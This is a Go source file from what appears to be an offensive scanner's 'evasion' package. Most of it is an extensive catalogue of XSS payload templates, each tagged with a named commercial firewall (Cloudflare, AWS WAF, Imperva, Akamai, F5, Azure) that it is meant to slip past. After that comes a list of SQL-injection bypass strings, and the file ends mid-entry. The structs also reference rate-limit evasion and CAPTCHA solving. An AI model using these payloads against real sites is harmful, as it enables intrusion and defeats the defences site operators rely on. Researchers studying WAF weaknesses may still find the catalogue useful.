package evasion

import (
	"context"
	"crypto/rand"
	"fmt"
	"math/big"
	"net/http"
	"strings"
	"time"

	"github.com/ezrec/ezrec/internal/log"
)

// EvasionEngine handles all evasion and bypass techniques
type EvasionEngine struct {
	wafBypass   *WAFBypassEngine
	rateLimiter *RateLimitEvasion
	captcha     *CaptchaSolver
	stealth     *StealthEngine
	logger      *log.Logger
}

// NewEvasionEngine creates a new evasion engine
func NewEvasionEngine(logger *log.Logger) *EvasionEngine {
	return &EvasionEngine{
		wafBypass:   NewWAFBypassEngine(),
		rateLimiter: NewRateLimitEvasion(),
		captcha:     NewCaptchaSolver("", ""), // Configure with API keys
		stealth:     NewStealthEngine(),
		logger:      logger,
	}
}

// WAF Bypass Engine
type WAFBypassEngine struct {
	techniques map[string][]BypassTechnique
}

type BypassTechnique struct {
	Name        string
	Category    string
	Template    string
	Description string
	WAFTypes    []string
	Confidence  float64
}

func NewWAFBypassEngine() *WAFBypassEngine {
	return &WAFBypassEngine{
		techniques: initializeBypassTechniques(),
	}
}

func initializeBypassTechniques() map[string][]BypassTechnique {
	return map[string][]BypassTechnique{
		"xss": {
			// CLOUDFLARE SPECIFIC BYPASSES - MASSIVE COLLECTION
			{
				Name:        "Cloudflare Unicode Bypass",
				Category:    "cloudflare_specific",
				Template:    "<\u0073cript>alert({payload})</\u0073cript>",
				Description: "Unicode characters specifically for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.9,
			},
			{
				Name:        "Cloudflare Comment Injection",
				Category:    "cloudflare_specific",
				Template:    "<script>/**/alert({payload})/**/</script>",
				Description: "Comment injection that bypasses Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.8,
			},
			{
				Name:        "Cloudflare SVG Vector",
				Category:    "cloudflare_specific",
				Template:    "<svg/onload=alert({payload})>",
				Description: "SVG vector optimized for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.9,
			},
			{
				Name:        "Cloudflare Polyglot 1",
				Category:    "cloudflare_specific",
				Template:    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert({payload}) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(//{payload}//)//\\x3e",
				Description: "Advanced Cloudflare polyglot",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.95,
			},
			{
				Name:        "Cloudflare HTML Entity Mix",
				Category:    "cloudflare_specific",
				Template:    "&#60;script&#62;alert({payload})&#60;/script&#62;",
				Description: "HTML entities that work on Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.8,
			},
			{
				Name:        "Cloudflare Event Handler",
				Category:    "cloudflare_specific",
				Template:    "<img src=x onerror=alert({payload})>",
				Description: "Event handler bypass for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.85,
			},
			{
				Name:        "Cloudflare Details Toggle",
				Category:    "cloudflare_specific",
				Template:    "<details open ontoggle=alert({payload})>",
				Description: "Details element bypass for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.8,
			},
			{
				Name:        "Cloudflare Template Literal",
				Category:    "cloudflare_specific",
				Template:    "<script>alert`{payload}`</script>",
				Description: "ES6 template literal for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.75,
			},
			{
				Name:        "Cloudflare Form Feed",
				Category:    "cloudflare_specific",
				Template:    "<script\f>alert({payload})</script>",
				Description: "Form feed character bypass",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.7,
			},
			{
				Name:        "Cloudflare Vertical Tab",
				Category:    "cloudflare_specific",
				Template:    "<script\x0b>alert({payload})</script>",
				Description: "Vertical tab bypass for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.8,
			},

			// AWS WAF SPECIFIC BYPASSES
			{
				Name:        "AWS WAF Double Encoding",
				Category:    "aws_waf_specific",
				Template:    "%253Cscript%253Ealert({payload})%253C/script%253E",
				Description: "Double URL encoding for AWS WAF",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.9,
			},
			{
				Name:        "AWS WAF Unicode Bypass",
				Category:    "aws_waf_specific",
				Template:    "\\u003cscript\\u003ealert({payload})\\u003c/script\\u003e",
				Description: "Unicode encoding for AWS WAF",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.85,
			},
			{
				Name:        "AWS WAF Mixed Encoding",
				Category:    "aws_waf_specific",
				Template:    "%3Cscr\\u0069pt%3Ealert({payload})%3C/scr\\u0069pt%3E",
				Description: "Mixed URL and Unicode encoding",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "AWS WAF Base64 Bypass",
				Category:    "aws_waf_specific",
				Template:    "<img src=x onerror=eval(atob('YWxlcnQoe3BheWxvYWR9KQ=='))>",
				Description: "Base64 encoded payload for AWS WAF",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.75,
			},
			{
				Name:        "AWS WAF Hex Encoding",
				Category:    "aws_waf_specific",
				Template:    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28{payload}\\x29')</script>",
				Description: "Hex encoded JavaScript for AWS WAF",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.7,
			},

			// MODSECURITY SPECIFIC BYPASSES
			{
				Name:        "ModSecurity MySQL Comment",
				Category:    "modsecurity_specific",
				Template:    "<script>/**/alert({payload})/**/</script>",
				Description: "MySQL-style comments for ModSecurity",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.85,
			},
			{
				Name:        "ModSecurity Version Comment",
				Category:    "modsecurity_specific",
				Template:    "<script>/*!50000alert({payload})*/</script>",
				Description: "MySQL version comment bypass",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.9,
			},
			{
				Name:        "ModSecurity Whitespace Mix",
				Category:    "modsecurity_specific",
				Template:    "<script\t\n\r >alert({payload})</script>",
				Description: "Mixed whitespace characters",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.8,
			},
			{
				Name:        "ModSecurity Case Bypass",
				Category:    "modsecurity_specific",
				Template:    "<ScRiPt>alert({payload})</ScRiPt>",
				Description: "Case manipulation for ModSecurity",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.75,
			},

			// IMPERVA SPECIFIC BYPASSES
			{
				Name:        "Imperva Hex Entity",
				Category:    "imperva_specific",
				Template:    "&#x3C;script&#x3E;alert({payload})&#x3C;/script&#x3E;",
				Description: "Hex HTML entities for Imperva",
				WAFTypes:    []string{"imperva"},
				Confidence:  0.8,
			},
			{
				Name:        "Imperva Tab Bypass",
				Category:    "imperva_specific",
				Template:    "<script\t>alert({payload})</script>",
				Description: "Tab character bypass for Imperva",
				WAFTypes:    []string{"imperva"},
				Confidence:  0.75,
			},
			{
				Name:        "Imperva Newline Bypass",
				Category:    "imperva_specific",
				Template:    "<script\n>alert({payload})</script>",
				Description: "Newline character bypass",
				WAFTypes:    []string{"imperva"},
				Confidence:  0.7,
			},

			// AKAMAI SPECIFIC BYPASSES
			{
				Name:        "Akamai Unicode Normalization",
				Category:    "akamai_specific",
				Template:    "<\u0073cript>alert({payload})</\u0073cript>",
				Description: "Unicode normalization for Akamai",
				WAFTypes:    []string{"akamai"},
				Confidence:  0.9,
			},
			{
				Name:        "Akamai Video Vector",
				Category:    "akamai_specific",
				Template:    "<video><source onerror=alert({payload})>",
				Description: "Video element bypass for Akamai",
				WAFTypes:    []string{"akamai"},
				Confidence:  0.8,
			},
			{
				Name:        "Akamai Polyglot 2",
				Category:    "akamai_specific",
				Template:    "'\">><marquee><img src=x onerror=confirm({payload})></marquee>\" onfocus=alert({payload}) autofocus>",
				Description: "Akamai-specific polyglot",
				WAFTypes:    []string{"akamai"},
				Confidence:  0.85,
			},
			{
				Name:        "Akamai Math Element",
				Category:    "akamai_specific",
				Template:    "<math><maction actiontype=toggle xlink:href=javascript:alert({payload})>CLICKME</maction></math>",
				Description: "Math element XSS for Akamai",
				WAFTypes:    []string{"akamai"},
				Confidence:  0.75,
			},
			{
				Name:        "Akamai Marquee Scroll",
				Category:    "akamai_specific",
				Template:    "<marquee onstart=alert({payload})>",
				Description: "Marquee element bypass",
				WAFTypes:    []string{"akamai"},
				Confidence:  0.7,
			},

			// F5 ASM SPECIFIC BYPASSES
			{
				Name:        "F5 ASM Null Byte XSS",
				Category:    "f5_asm_specific",
				Template:    "<script%00>alert({payload})</script>",
				Description: "Null byte in script tag for F5 ASM",
				WAFTypes:    []string{"f5_asm"},
				Confidence:  0.8,
			},
			{
				Name:        "F5 ASM CRLF Injection",
				Category:    "f5_asm_specific",
				Template:    "<script%0d%0a>alert({payload})</script>",
				Description: "CRLF injection for F5 ASM",
				WAFTypes:    []string{"f5_asm"},
				Confidence:  0.75,
			},
			{
				Name:        "F5 ASM Iframe Src",
				Category:    "f5_asm_specific",
				Template:    "<iframe src=javascript:alert({payload})>",
				Description: "Iframe javascript src for F5",
				WAFTypes:    []string{"f5_asm"},
				Confidence:  0.7,
			},
			{
				Name:        "F5 ASM Object Data",
				Category:    "f5_asm_specific",
				Template:    "<object data=javascript:alert({payload})>",
				Description: "Object data javascript for F5",
				WAFTypes:    []string{"f5_asm"},
				Confidence:  0.65,
			},
			{
				Name:        "F5 ASM Embed Src",
				Category:    "f5_asm_specific",
				Template:    "<embed src=javascript:alert({payload})>",
				Description: "Embed element bypass",
				WAFTypes:    []string{"f5_asm"},
				Confidence:  0.6,
			},

			// AZURE WAF SPECIFIC BYPASSES
			{
				Name:        "Azure WAF Triple Encoding XSS",
				Category:    "azure_waf_specific",
				Template:    "%25253Cscript%25253Ealert({payload})%25253C/script%25253E",
				Description: "Triple URL encoding for Azure WAF",
				WAFTypes:    []string{"azure_waf"},
				Confidence:  0.85,
			},
			{
				Name:        "Azure WAF Unicode Mix",
				Category:    "azure_waf_specific",
				Template:    "\\u003cscript\\u003ealert({payload})\\u003c\\u002fscript\\u003e",
				Description: "Full Unicode encoding for Azure",
				WAFTypes:    []string{"azure_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Azure WAF Form Element",
				Category:    "azure_waf_specific",
				Template:    "<form><button formaction=javascript:alert({payload})>CLICK",
				Description: "Form button bypass for Azure",
				WAFTypes:    []string{"azure_waf"},
				Confidence:  0.75,
			},
			{
				Name:        "Azure WAF Link Import",
				Category:    "azure_waf_specific",
				Template:    "<link rel=import href=javascript:alert({payload})>",
				Description: "Link import bypass",
				WAFTypes:    []string{"azure_waf"},
				Confidence:  0.7,
			},
			{
				Name:        "Azure WAF Meta Refresh",
				Category:    "azure_waf_specific",
				Template:    "<meta http-equiv=refresh content=0;url=javascript:alert({payload})>",
				Description: "Meta refresh XSS",
				WAFTypes:    []string{"azure_waf"},
				Confidence:  0.65,
			},

			// MASSIVE GENERIC XSS BYPASSES
			{
				Name:        "Textarea Placeholder",
				Category:    "alternative_vectors",
				Template:    "<textarea placeholder=x onfocus=alert({payload}) autofocus>",
				Description: "Textarea with placeholder and autofocus",
				WAFTypes:    []string{"all"},
				Confidence:  0.8,
			},
			{
				Name:        "Select Autofocus",
				Category:    "alternative_vectors",
				Template:    "<select onfocus=alert({payload}) autofocus>",
				Description: "Select element with autofocus",
				WAFTypes:    []string{"all"},
				Confidence:  0.75,
			},
			{
				Name:        "Keygen Autofocus",
				Category:    "alternative_vectors",
				Template:    "<keygen onfocus=alert({payload}) autofocus>",
				Description: "Keygen element bypass",
				WAFTypes:    []string{"all"},
				Confidence:  0.7,
			},
			{
				Name:        "Dialog Open",
				Category:    "alternative_vectors",
				Template:    "<dialog open onclose=alert({payload})><form method=dialog><button>X</button></form>",
				Description: "Dialog element XSS",
				WAFTypes:    []string{"all"},
				Confidence:  0.65,
			},
			{
				Name:        "Summary Toggle",
				Category:    "alternative_vectors",
				Template:    "<details><summary ontoggle=alert({payload})>CLICK</summary>",
				Description: "Summary element toggle",
				WAFTypes:    []string{"all"},
				Confidence:  0.6,
			},
			{
				Name:        "Fieldset Disabled",
				Category:    "alternative_vectors",
				Template:    "<fieldset disabled><legend>x</legend><input onfocus=alert({payload}) autofocus>",
				Description: "Fieldset with disabled bypass",
				WAFTypes:    []string{"all"},
				Confidence:  0.55,
			},
			{
				Name:        "Output For",
				Category:    "alternative_vectors",
				Template:    "<form><output for=x name=y>z</output><input name=x value=1 onchange=alert({payload})>",
				Description: "Output element XSS",
				WAFTypes:    []string{"all"},
				Confidence:  0.5,
			},
			{
				Name:        "Progress Value",
				Category:    "alternative_vectors",
				Template:    "<progress value=1 max=1 onclick=alert({payload})>",
				Description: "Progress element XSS",
				WAFTypes:    []string{"all"},
				Confidence:  0.45,
			},
			{
				Name:        "Meter Value",
				Category:    "alternative_vectors",
				Template:    "<meter value=1 min=0 max=2 onclick=alert({payload})>",
				Description: "Meter element XSS",
				WAFTypes:    []string{"all"},
				Confidence:  0.4,
			},
			{
				Name:        "Canvas Context",
				Category:    "alternative_vectors",
				Template:    "<canvas onclick=alert({payload})>",
				Description: "Canvas element XSS",
				WAFTypes:    []string{"all"},
				Confidence:  0.35,
			},

			// DOM-BASED XSS BYPASSES
			{
				Name:        "DOM innerHTML",
				Category:    "dom_based",
				Template:    "<img src=x onerror=document.body.innerHTML='<script>alert({payload})</script>'>",
				Description: "DOM innerHTML manipulation",
				WAFTypes:    []string{"dom_based"},
				Confidence:  0.8,
			},
			{
				Name:        "DOM outerHTML",
				Category:    "dom_based",
				Template:    "<img src=x onerror=this.outerHTML='<script>alert({payload})</script>'>",
				Description: "DOM outerHTML manipulation",
				WAFTypes:    []string{"dom_based"},
				Confidence:  0.75,
			},
			{
				Name:        "DOM insertAdjacentHTML",
				Category:    "dom_based",
				Template:    "<img src=x onerror=this.insertAdjacentHTML('afterend','<script>alert({payload})</script>')>",
				Description: "insertAdjacentHTML XSS",
				WAFTypes:    []string{"dom_based"},
				Confidence:  0.7,
			},
			{
				Name:        "DOM createContextualFragment",
				Category:    "dom_based",
				Template:    "<img src=x onerror=document.createRange().createContextualFragment('<script>alert({payload})</script>')>",
				Description: "createContextualFragment XSS",
				WAFTypes:    []string{"dom_based"},
				Confidence:  0.65,
			},
			{
				Name:        "DOM appendChild",
				Category:    "dom_based",
				Template:    "<img src=x onerror=document.body.appendChild(document.createElement('script')).innerHTML='alert({payload})'>",
				Description: "appendChild script creation",
				WAFTypes:    []string{"dom_based"},
				Confidence:  0.6,
			},

			// CSS-BASED XSS BYPASSES
			{
				Name:        "CSS Expression",
				Category:    "css_based",
				Template:    "<div style=width:expression(alert({payload}))>",
				Description: "CSS expression XSS (IE)",
				WAFTypes:    []string{"legacy"},
				Confidence:  0.3,
			},
			{
				Name:        "CSS Import",
				Category:    "css_based",
				Template:    "<style>@import'javascript:alert({payload})';</style>",
				Description: "CSS import javascript",
				WAFTypes:    []string{"css_aware"},
				Confidence:  0.4,
			},
			{
				Name:        "CSS Background",
				Category:    "css_based",
				Template:    "<div style=background:url(javascript:alert({payload}))>",
				Description: "CSS background javascript",
				WAFTypes:    []string{"css_aware"},
				Confidence:  0.35,
			},
			{
				Name:        "CSS Animation",
				Category:    "css_based",
				Template:    "<style>@keyframes x{from{color:red}to{color:blue}}div{animation:x 1s}div:hover{background:url(javascript:alert({payload}))}</style><div>HOVER</div>",
				Description: "CSS animation XSS",
				WAFTypes:    []string{"css_aware"},
				Confidence:  0.25,
			},

			// GENERIC SCRIPT TAG BYPASSES
			{
				Name:        "Mixed Case Bypass",
				Category:    "case_manipulation",
				Template:    "<ScRiPt>alert({payload})</ScRiPt>",
				Description: "Uses mixed case to bypass case-sensitive filters",
				WAFTypes:    []string{"basic", "regex_based"},
				Confidence:  0.7,
			},
			{
				Name:        "Upper Case Script",
				Category:    "case_manipulation",
				Template:    "<SCRIPT>alert({payload})</SCRIPT>",
				Description: "All uppercase script tags",
				WAFTypes:    []string{"basic", "case_sensitive"},
				Confidence:  0.6,
			},
			{
				Name:        "HTML Entity Encoding",
				Category:    "encoding",
				Template:    "&#60;script&#62;alert({payload})&#60;/script&#62;",
				Description: "Uses HTML entities to encode script tags",
				WAFTypes:    []string{"cloudflare", "aws_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Hex Entity Encoding",
				Category:    "encoding",
				Template:    "&#x3C;script&#x3E;alert({payload})&#x3C;/script&#x3E;",
				Description: "Uses hex HTML entities",
				WAFTypes:    []string{"cloudflare", "imperva"},
				Confidence:  0.7,
			},
			{
				Name:        "JavaScript Comment Injection",
				Category:    "comment_injection",
				Template:    "<script>/**/alert({payload})/**/</script>",
				Description: "Injects comments to break pattern matching",
				WAFTypes:    []string{"modsecurity", "imperva"},
				Confidence:  0.6,
			},
			{
				Name:        "Multi-line Comment Bypass",
				Category:    "comment_injection",
				Template:    "<script>/*\nalert({payload})\n*/</script>",
				Description: "Multi-line comments with newlines",
				WAFTypes:    []string{"basic", "regex_based"},
				Confidence:  0.5,
			},
			{
				Name:        "Unicode Normalization",
				Category:    "encoding",
				Template:    "<\u0073cript>alert({payload})</\u0073cript>",
				Description: "Uses unicode characters to bypass filters",
				WAFTypes:    []string{"akamai", "cloudflare"},
				Confidence:  0.9,
			},
			{
				Name:        "Unicode Script Tag",
				Category:    "encoding",
				Template:    "<\u0073\u0063\u0072\u0069\u0070\u0074>alert({payload})</\u0073\u0063\u0072\u0069\u0070\u0074>",
				Description: "Full unicode encoded script tag",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.8,
			},

			// EVENT HANDLER BYPASSES
			{
				Name:        "Event Handler Bypass",
				Category:    "alternative_vectors",
				Template:    "<img src=x onerror=alert({payload})>",
				Description: "Uses event handlers instead of script tags",
				WAFTypes:    []string{"all"},
				Confidence:  0.8,
			},
			{
				Name:        "SVG onload",
				Category:    "alternative_vectors",
				Template:    "<svg onload=alert({payload})>",
				Description: "SVG with onload event",
				WAFTypes:    []string{"cloudflare", "basic"},
				Confidence:  0.9,
			},
			{
				Name:        "Body onload",
				Category:    "alternative_vectors",
				Template:    "<body onload=alert({payload})>",
				Description: "Body tag with onload event",
				WAFTypes:    []string{"basic", "older_waf"},
				Confidence:  0.6,
			},
			{
				Name:        "Input autofocus",
				Category:    "alternative_vectors",
				Template:    "<input autofocus onfocus=alert({payload})>",
				Description: "Input with autofocus and onfocus",
				WAFTypes:    []string{"modern_waf"},
				Confidence:  0.7,
			},
			{
				Name:        "Details ontoggle",
				Category:    "alternative_vectors",
				Template:    "<details open ontoggle=alert({payload})>",
				Description: "Details element with ontoggle",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Video onerror",
				Category:    "alternative_vectors",
				Template:    "<video><source onerror=alert({payload})>",
				Description: "Video source with onerror",
				WAFTypes:    []string{"cloudflare", "akamai"},
				Confidence:  0.7,
			},
			{
				Name:        "Audio onerror",
				Category:    "alternative_vectors",
				Template:    "<audio src=x onerror=alert({payload})>",
				Description: "Audio element with onerror",
				WAFTypes:    []string{"basic", "modsecurity"},
				Confidence:  0.6,
			},

			// JAVASCRIPT PROTOCOL BYPASSES
			{
				Name:        "JavaScript Protocol",
				Category:    "protocol",
				Template:    "<a href=\"javascript:alert({payload})\">click</a>",
				Description: "JavaScript protocol in href",
				WAFTypes:    []string{"basic"},
				Confidence:  0.5,
			},
			{
				Name:        "Data URI JavaScript",
				Category:    "protocol",
				Template:    "<iframe src=\"data:text/html,<script>alert({payload})</script>\">",
				Description: "Data URI with embedded JavaScript",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "VBScript Protocol",
				Category:    "protocol",
				Template:    "<img src=x onerror=vbscript:alert({payload})>",
				Description: "VBScript protocol (IE only)",
				WAFTypes:    []string{"legacy_waf"},
				Confidence:  0.3,
			},

			// ENCODING BYPASSES
			{
				Name:        "URL Encoding",
				Category:    "encoding",
				Template:    "%3Cscript%3Ealert({payload})%3C/script%3E",
				Description: "URL encoded script tags",
				WAFTypes:    []string{"basic", "regex_based"},
				Confidence:  0.6,
			},
			{
				Name:        "Double URL Encoding",
				Category:    "encoding",
				Template:    "%253Cscript%253Ealert({payload})%253C/script%253E",
				Description: "Double URL encoded script tags",
				WAFTypes:    []string{"aws_waf", "azure_waf"},
				Confidence:  0.7,
			},
			{
				Name:        "Base64 Encoding",
				Category:    "encoding",
				Template:    "<img src=x onerror=eval(atob('YWxlcnQoe3BheWxvYWR9KQ=='))>",
				Description: "Base64 encoded payload",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Hex Encoding",
				Category:    "encoding",
				Template:    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28{payload}\\x29')</script>",
				Description: "Hex encoded JavaScript",
				WAFTypes:    []string{"modsecurity", "imperva"},
				Confidence:  0.7,
			},
			{
				Name:        "Octal Encoding",
				Category:    "encoding",
				Template:    "<script>eval('\\141\\154\\145\\162\\164\\50{payload}\\51')</script>",
				Description: "Octal encoded JavaScript",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.6,
			},

			// POLYGLOT BYPASSES
			{
				Name:        "XSS Polyglot 1",
				Category:    "polyglot",
				Template:    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert({payload}) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(//{payload}//)//\\x3e",
				Description: "Advanced XSS polyglot payload",
				WAFTypes:    []string{"all"},
				Confidence:  0.9,
			},
			{
				Name:        "XSS Polyglot 2",
				Category:    "polyglot",
				Template:    "'\">><marquee><img src=x onerror=confirm({payload})></marquee>\" onfocus=alert({payload}) autofocus>",
				Description: "Multi-context XSS polyglot",
				WAFTypes:    []string{"cloudflare", "akamai"},
				Confidence:  0.8,
			},

			// WHITESPACE BYPASSES
			{
				Name:        "Tab Whitespace",
				Category:    "whitespace",
				Template:    "<script\t>alert({payload})</script>",
				Description: "Tab character in script tag",
				WAFTypes:    []string{"basic", "regex_based"},
				Confidence:  0.6,
			},
			{
				Name:        "Newline Whitespace",
				Category:    "whitespace",
				Template:    "<script\n>alert({payload})</script>",
				Description: "Newline character in script tag",
				WAFTypes:    []string{"basic", "modsecurity"},
				Confidence:  0.7,
			},
			{
				Name:        "Form Feed Whitespace",
				Category:    "whitespace",
				Template:    "<script\f>alert({payload})</script>",
				Description: "Form feed character in script tag",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.5,
			},
			{
				Name:        "Null Byte Whitespace",
				Category:    "whitespace",
				Template:    "<script\x00>alert({payload})</script>",
				Description: "Null byte in script tag",
				WAFTypes:    []string{"legacy_waf"},
				Confidence:  0.4,
			},

			// MUTATION XSS
			{
				Name:        "mXSS via innerHTML",
				Category:    "mutation",
				Template:    "<listing>&lt;img src=x onerror=alert({payload})&gt;</listing>",
				Description: "Mutation XSS via listing element",
				WAFTypes:    []string{"dom_based"},
				Confidence:  0.8,
			},
			{
				Name:        "mXSS via noscript",
				Category:    "mutation",
				Template:    "<noscript><p title=\"</noscript><img src=x onerror=alert({payload})\">",
				Description: "Mutation XSS via noscript",
				WAFTypes:    []string{"client_side"},
				Confidence:  0.7,
			},

			// TEMPLATE INJECTION
			{
				Name:        "Template Literal",
				Category:    "template",
				Template:    "<script>alert`{payload}`</script>",
				Description: "ES6 template literal",
				WAFTypes:    []string{"modern_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Tagged Template",
				Category:    "template",
				Template:    "<script>alert`{payload}`</script>",
				Description: "Tagged template literal",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.7,
			},
		},
		"sqli": {
			// CLOUDFLARE SPECIFIC SQLi BYPASSES
			{
				Name:        "Cloudflare Vertical Tab",
				Category:    "cloudflare_specific",
				Template:    "1' %0bOR%0b1=1--",
				Description: "Vertical tab bypass specific for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.9,
			},
			{
				Name:        "Cloudflare Unicode OR",
				Category:    "cloudflare_specific",
				Template:    "1' \\u004f\\u0052 1=1--",
				Description: "Unicode encoded OR for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.85,
			},
			{
				Name:        "Cloudflare Mixed Case",
				Category:    "cloudflare_specific",
				Template:    "1' oR 1=1--",
				Description: "Mixed case OR for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.8,
			},
			{
				Name:        "Cloudflare Form Feed",
				Category:    "cloudflare_specific",
				Template:    "1' %0cOR%0c1=1--",
				Description: "Form feed character for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.75,
			},
			{
				Name:        "Cloudflare Double Space",
				Category:    "cloudflare_specific",
				Template:    "1'  OR  1=1--",
				Description: "Double space bypass for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.7,
			},

			// AWS WAF SPECIFIC SQLi BYPASSES
			{
				Name:        "AWS WAF Double URL Encoding",
				Category:    "aws_waf_specific",
				Template:    "1'%252520OR%252520'1'='1",
				Description: "Double URL encoding for AWS WAF",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.9,
			},
			{
				Name:        "AWS WAF LIKE Operator",
				Category:    "aws_waf_specific",
				Template:    "1' OR(1)LIKE(1)--",
				Description: "LIKE operator bypass for AWS WAF",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.85,
			},
			{
				Name:        "AWS WAF RLIKE Bypass",
				Category:    "aws_waf_specific",
				Template:    "1' OR 1 RLIKE '^1'--",
				Description: "RLIKE operator for AWS WAF",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "AWS WAF Hex Values",
				Category:    "aws_waf_specific",
				Template:    "1' OR 0x31=0x31--",
				Description: "Hex encoded values for AWS WAF",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.75,
			},
			{
				Name:        "AWS WAF CONCAT Bypass",
				Category:    "aws_waf_specific",
				Template:    "1' OR CONCAT('1','1')='11'--",
				Description: "CONCAT function bypass",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.7,
			},

			// MODSECURITY SPECIFIC SQLi BYPASSES
			{
				Name:        "ModSecurity MySQL Version Comment",
				Category:    "modsecurity_specific",
				Template:    "1' /*!50000OR*/ 1=1--",
				Description: "MySQL version comment for ModSecurity",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.95,
			},
			{
				Name:        "ModSecurity Nested Comments",
				Category:    "modsecurity_specific",
				Template:    "1' /*! /**/OR/**/ */ 1=1--",
				Description: "Nested MySQL comments",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.9,
			},
			{
				Name:        "ModSecurity Version 40000",
				Category:    "modsecurity_specific",
				Template:    "1' /*!40000OR*/ 1=1--",
				Description: "MySQL 4.0 version comment",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.85,
			},
			{
				Name:        "ModSecurity Multiple Comments",
				Category:    "modsecurity_specific",
				Template:    "1' /**/OR/**/1/**/=/**/1--",
				Description: "Multiple comment injection",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.8,
			},
			{
				Name:        "ModSecurity Whitespace Mix",
				Category:    "modsecurity_specific",
				Template:    "1'\t\n\rOR\t\n\r1=1--",
				Description: "Mixed whitespace characters",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.75,
			},

			// IMPERVA SPECIFIC SQLi BYPASSES
			{
				Name:        "Imperva REGEXP Bypass",
				Category:    "imperva_specific",
				Template:    "1' OR 1 REGEXP '^1'--",
				Description: "REGEXP operator for Imperva",
				WAFTypes:    []string{"imperva"},
				Confidence:  0.9,
			},
			{
				Name:        "Imperva Tab Injection",
				Category:    "imperva_specific",
				Template:    "1'\tOR\t1=1--",
				Description: "Tab character injection for Imperva",
				WAFTypes:    []string{"imperva"},
				Confidence:  0.85,
			},
			{
				Name:        "Imperva SOUNDS LIKE",
				Category:    "imperva_specific",
				Template:    "1' OR '1' SOUNDS LIKE '1'--",
				Description: "SOUNDS LIKE operator bypass",
				WAFTypes:    []string{"imperva"},
				Confidence:  0.8,
			},
			{
				Name:        "Imperva Binary Operator",
				Category:    "imperva_specific",
				Template:    "1' OR BINARY '1'='1'--",
				Description: "BINARY operator for Imperva",
				WAFTypes:    []string{"imperva"},
				Confidence:  0.75,
			},

			// F5 ASM SPECIFIC SQLi BYPASSES
			{
				Name:        "F5 ASM NULL Byte",
				Category:    "f5_asm_specific",
				Template:    "1' OR%001=1--",
				Description: "NULL byte injection for F5 ASM",
				WAFTypes:    []string{"f5_asm"},
				Confidence:  0.8,
			},
			{
				Name:        "F5 ASM Carriage Return",
				Category:    "f5_asm_specific",
				Template:    "1' %0dOR%0d1=1--",
				Description: "Carriage return bypass",
				WAFTypes:    []string{"f5_asm"},
				Confidence:  0.75,
			},
			{
				Name:        "F5 ASM Line Feed",
				Category:    "f5_asm_specific",
				Template:    "1' %0aOR%0a1=1--",
				Description: "Line feed character bypass",
				WAFTypes:    []string{"f5_asm"},
				Confidence:  0.7,
			},

			// AZURE WAF SPECIFIC SQLi BYPASSES
			{
				Name:        "Azure WAF Triple Encoding",
				Category:    "azure_waf_specific",
				Template:    "1'%25252520OR%25252520'1'='1",
				Description: "Triple URL encoding for Azure WAF",
				WAFTypes:    []string{"azure_waf"},
				Confidence:  0.85,
			},
			{
				Name:        "Azure WAF Unicode Mix",
				Category:    "azure_waf_specific",
				Template:    "1' \\u004f%52 1=1--",
				Description: "Mixed Unicode and URL encoding",
				WAFTypes:    []string{"azure_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Azure WAF CHAR Function",
				Category:    "azure_waf_specific",
				Template:    "1' OR CHAR(49)=CHAR(49)--",
				Description: "CHAR function for Azure WAF",
